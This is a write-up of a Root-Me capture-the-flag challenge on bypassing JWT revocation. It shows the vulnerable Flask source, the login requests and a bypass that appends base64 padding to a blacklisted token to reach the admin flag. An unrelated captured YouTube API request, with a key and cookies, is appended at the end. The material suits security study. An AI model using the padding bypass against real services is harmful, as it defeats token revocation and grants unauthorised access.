# JWT - Revoked token(Black list, Expire bypass)

Reference: https://www.4rth4s.xyz/

***

Two endpoints are available :

```
POST : /web-serveur/ch63/login
```

GET : /web-serveur/ch63/admin

***

source.py

```
#!/usr/bin/env python3
    # -*- coding: utf-8 -*-
    from flask import Flask, request, jsonify
    from flask_jwt_extended import JWTManager, jwt_required, create_access_token, decode_token
    import datetime
    from apscheduler.schedulers.background import BackgroundScheduler
    import threading
    import jwt
    from config import *
     
    # Setup flask
    app = Flask(__name__)
     
    app.config['JWT_SECRET_KEY'] = SECRET
    jwtmanager = JWTManager(app)
    blacklist = set()
    lock = threading.Lock()
     
    # Free memory from expired tokens, as they are no longer useful
    def delete_expired_tokens():
        with lock:
            to_remove = set()
            global blacklist
            for access_token in blacklist:
                try:
                    jwt.decode(access_token, app.config['JWT_SECRET_KEY'],algorithm='HS256')
                except:
                    to_remove.add(access_token)
           
            blacklist = blacklist.difference(to_remove)
     
    @app.route("/web-serveur/ch63/")
    def index():
        return "POST : /web-serveur/ch63/login <br>\nGET : /web-serveur/ch63/admin"
     
    # Standard login endpoint
    @app.route('/web-serveur/ch63/login', methods=['POST'])
    def login():
        try:
            username = request.json.get('username', None)
            password = request.json.get('password', None)
        except:
            return jsonify({"msg":"""Bad request. Submit your login / pass as {"username":"admin","password":"admin"}"""}), 400
     
        if username != 'admin' or password != 'admin':
            return jsonify({"msg": "Bad username or password"}), 401
     
        access_token = create_access_token(identity=username,expires_delta=datetime.timedelta(minutes=3))
        ret = {
            'access_token': access_token,
        }
       
        with lock:
            blacklist.add(access_token)
     
        return jsonify(ret), 200
     
    # Standard admin endpoint
    @app.route('/web-serveur/ch63/admin', methods=['GET'])
    @jwt_required
    def protected():
        access_token = request.headers.get("Authorization").split()[1]
        with lock:
            if access_token in blacklist:
                return jsonify({"msg":"Token is revoked"})
            else:
                return jsonify({'Congratzzzz!!!_flag:': FLAG})
     
     
    if __name__ == '__main__':
        scheduler = BackgroundScheduler()
        job = scheduler.add_job(delete_expired_tokens, 'interval', seconds=10)
        scheduler.start()
        app.run(debug=False, host='0.0.0.0', port=5000)
```

***

post request

```
POST /web-serveur/ch63/login HTTP/1.1
Host: challenge01.root-me.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: _ga_SRYSKX09J7=GS1.1.1662082169.34.1.1662082188.0.0.0; _ga=GA1.1.536088429.1661133467;
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```

\->

result

```
HTTP/1.1 400 BAD REQUEST
Server: nginx
Date: Fri, 02 Sep 2022 07:06:38 GMT
Content-Type: application/json
Content-Length: 99
Connection: close

{"msg":"Bad request. Submit your login / pass as {\"username\":\"admin\",\"password\":\"admin\"}"}
```

then modifying the request

```
POST /web-serveur/ch63/login HTTP/1.1
Host: challenge01.root-me.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Content-type: application/json
Cookie: _ga_SRYSKX09J7=GS1.1.1662082169.34.1.1662082188.0.0.0; _ga=GA1.1.536088429.1661133467;
Upgrade-Insecure-Requests: 1
Content-Length: 48

{"username":"admin","password":"admin"}
```

modifying a content-type header and filling a data field.

\->

received: {"access\_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NjIxMDM2MjQsIm5iZiI6MTY2MjEwMzYyNCwianRpIjoiNDgyMGJmM2MtNWViNi00YTkzLWJiOGItYTI4MzNlZTU3ODVjIiwiZXhwIjoxNjYyMTAzODA0LCJpZGVudGl0eSI6ImFkbWluIiwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.FNwaDVwRyumQUFjadENTPXL0\_V-zh7nT6FZQbaIuOBU"}

\->

but according to source code

```
with lock:
            blacklist.add(access_token)
```

that token got immeditately black listed

&&

get request

```
GET /web-serveur/ch63/admin HTTP/1.1
Host: challenge01.root-me.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NjIxMDM2MjQsIm5iZiI6MTY2MjEwMzYyNCwianRpIjoiNDgyMGJmM2MtNWViNi00YTkzLWJiOGItYTI4MzNlZTU3ODVjIiwiZXhwIjoxNjYyMTAzODA0LCJpZGVudGl0eSI6ImFkbWluIiwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.FNwaDVwRyumQUFjadENTPXL0_V-zh7nT6FZQbaIuOBU==
Connection: close
Cookie: _ga_SRYSKX09J7=GS1.1.1662082169.34.1.1662082188.0.0.0; _ga=GA1.1.536088429.1661133467;
Upgrade-Insecure-Requests: 1
```

\->

result

```
HTTP/1.1 401 UNAUTHORIZED
Server: nginx
Date: Fri, 02 Sep 2022 07:32:47 GMT
Content-Type: application/json
Content-Length: 28
Connection: close

{"msg":"Token has expired"}
```

\->

however for base64 encode, something <=> something== or something= so modify the request and send

```
GET /web-serveur/ch63/admin HTTP/1.1
Host: challenge01.root-me.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NjIxMDQxMjgsIm5iZiI6MTY2MjEwNDEyOCwianRpIjoiOWQ3OGRhM2ItYjliYS00N2IxLTllOWItYmI3OTcyNDM2MDFiIiwiZXhwIjoxNjYyMTA0MzA4LCJpZGVudGl0eSI6ImFkbWluIiwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.mfJd60KNgHqBijzVWTiIDRp9RXQipHf01BIrvlg1D0c=
Connection: close
Cookie: _ga_SRYSKX09J7=GS1.1.1662082169.34.1.1662082188.0.0.0; _ga=GA1.1.536088429.1661133467;
Upgrade-Insecure-Requests: 1
```

\->

and got the flag {"Congratzzzz!!!\_flag:":"Do\_n0t\_r3v0ke\_3nc0d3dTokenz\_Mam3ne-Us3\_th3\_JTI\_f1eld"}

***

Appendix:

```
POST /youtubei/v1/log_event?alt=json&key=AIzaSyAO_FJ2SlqU8Q4STEHLGCilw_Y9_11qcW8 HTTP/2
Host: www.youtube.com
Cookie: YSC=Q8wFThOuKlQ; VISITOR_INFO1_LIVE=TiSB4RqTyzM
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Goog-Request-Time: 1662104806864
Content-Type: application/json
X-Goog-Visitor-Id: CgtXdmJYcHktRDF3SSirtMCYBg%3D%3D
X-Youtube-Client-Name: 56
X-Youtube-Client-Version: 1.20220830.01.00
X-Youtube-Utc-Offset: -240
X-Youtube-Time-Zone: America/New_York
X-Youtube-Ad-Signals: dt=1661999661231&flash=0&frm=2&u_tz=-240&u_his=4&u_h=1080&u_w=1920&u_ah=1045&u_aw=1920&u_cd=24&bc=31&bih=-12245933&biw=-12245933&brdim=0%2C35%2C0%2C35%2C1920%2C35%2C1910%2C1009%2C1000%2C563&vis=2&wgl=true&ca_type=image
Content-Length: 940
Origin: https://www.youtube.com
Referer: https://www.youtube.com/embed/9SWYvhY5dYw
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

{"context":{"client":{"hl":"en","gl":"KR","clientName":56,"clientVersion":"1.20220830.01.00","configInfo":{"appInstallData":"CKu0wJgGEMvs_RIQuIuuBRC3y60FEPSA_hIQ9v_9EhDivK4FEPy6rgUQ8__9EhDUg64FEJOvrgUQ4rmuBRDYvq0F"},"userAgent":"Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"}},"events":[{"eventTimeMs":1662104793869,"idbTransactionEnded":{"objectStoreNames":"LogsRequestsStore","connectionHasUnknownAbortedTransaction":false,"duration":11,"isSuccessful":true,"tryCount":1,"tag":"IDB_TRANSACTION_TAG_UNKNOWN"},"context":{"lastActivityMs":"105134673"}},{"eventTimeMs":1662104796459,"idbTransactionEnded":{"objectStoreNames":"LogsRequestsStore","connectionHasUnknownAbortedTransaction":false,"duration":11,"isSuccessful":true,"tryCount":1,"tag":"IDB_TRANSACTION_TAG_UNKNOWN"},"context":{"lastActivityMs":"105137262"}}],"serializedClientEventId":{"serializedEventId":"KxoQY5OXBLHL2roPzMWh0AE","clientCounter":"15699"}}
```

you can see the api end point with json format applied in real life too.
